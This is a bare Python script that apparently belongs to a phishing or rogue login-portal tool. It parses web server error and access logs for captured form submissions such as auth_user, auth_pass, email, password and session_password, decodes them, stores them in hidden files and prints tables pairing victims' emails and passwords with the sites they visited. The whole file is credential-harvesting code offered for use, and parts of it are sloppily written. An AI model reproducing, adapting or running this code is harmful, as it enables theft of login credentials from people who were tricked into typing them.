#!/usr/bin/env python3

import sys
import time
import os
import re
Path_St = "/".join(os.path.abspath(__file__).split('/'))[:-16]


class Get_Info :
    
     def __init__(self):
        self.Get_Password()
     def Get_Password(self):
     
         print(" "+"-"*79)
         print("| "+f"{'       EMAIL    ':<35}","  | "+f"{'         PASSWORD   ':<35}   |")
         print(" "+"-"*79)
         with open(Path_St+'log_error.log') as Log_Handel :
              Log_read = Log_Handel.readlines()
         for line in Log_read :   
            if "auth_" in  line :
               line = line.split('auth_user=')
               line = str(line[-1]).split('auth_pass=')
               line = str(line).replace('&accept=Login','').replace('%40','@').replace('&',' ')\
               .replace('\\n','').replace("['",'').replace("']",'').replace("'",'').split(',')
               print("| "+"  "+f"{   line[0]    :<35}","| "+"  "+f"{      line[1]    :<35} |")

if __name__ =='__main__':
   Get_Info()

class dns_result :
      
      def __init__(self):
         print(" "+"-"*102)
         print("| "+f"{'       Site-Name    ':<20}",' |'+f"{'       auth_user    ':<35}","  | "+f"{'         PASSWORD   ':<35}   |")
         print(" "+"-"*102)
         self.web_Password()
      def web_Password(self):
          list_web = []
          with open(".web.tx",'w') as file:
               with open (".Cread.txt",'w') as Cread_User :
                  pass  
          with open(Path_St+'log_error.log') as Log_Handel :
              Log_read = Log_Handel.readlines()
          for line in Log_read:     
              if '%40'in  line  :             
                line       = line.split('=')
                line_split = str(line[1:3]).split('+&password')
                line_cread = str("".join(line_split)).replace('+&password',' ').replace('&captcha_text',' ').split(',')
                line_cread_1 = str("".join(line_cread[0])).replace("['",'').replace("'",'')\
                .replace('%40','@').replace("&password",'').replace('+&key1','').replace('&key1','').replace('&session_password','')
                line_cread_2 = str("".join(line_cread[1])).replace("]",'')\
                .replace("']",'').replace("'",'').replace('\\n','').replace("&signIn",'').replace('&isJsEnabled','').strip()
                with open (".Cread.txt",'a') as Cread_User :
                     Cread_User.write(line_cread_1+'\n'+line_cread_2+'\n')
                with open('log_access.log','r') as accesslog:
                    accesslog = accesslog.readlines()#[-243:]
                    for line1 in accesslog:    
                      if "GET" in line1 or "POST" in line1:
                          self.domain_web = str(re.findall('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', line1 ))\
                          .replace("[('', '",'').replace("')]",'').replace("', '.",'.').replace('[]','').replace('\n','')
                          if self.domain_web not in  list_web:
                               list_web.append(self.domain_web) 
          with open('.web.tx','r')as FileWeb:
              if list_web in FileWeb:
                    pass
              else:
                  with open('.web.tx','a') as FileWeb :
                      WebVisit = FileWeb.write(str(list_web)\
                      .replace("['', '",'').replace("']",'').replace("', '",'\n'))
          with open('.web.tx','r')as FileWeb :
                WebVisit = FileWeb.read().split()             
          with open (".Cread.txt",'r') as Cread_User :  
                Cread_auth = Cread_User.read().split()
          count = 0
          count1 = 0        
          for i in range(len(WebVisit)):       
              print("| "+"  "+f"{ WebVisit[count]:<20}"+"|  "
              +f"{  Cread_auth[count1]   :<35}","| "+"  "+f"{     Cread_auth[count1+1]  :<35} |")  
              count  +=1
              count1 +=2

   
if __name__ =='__main__':
   dns_result()   
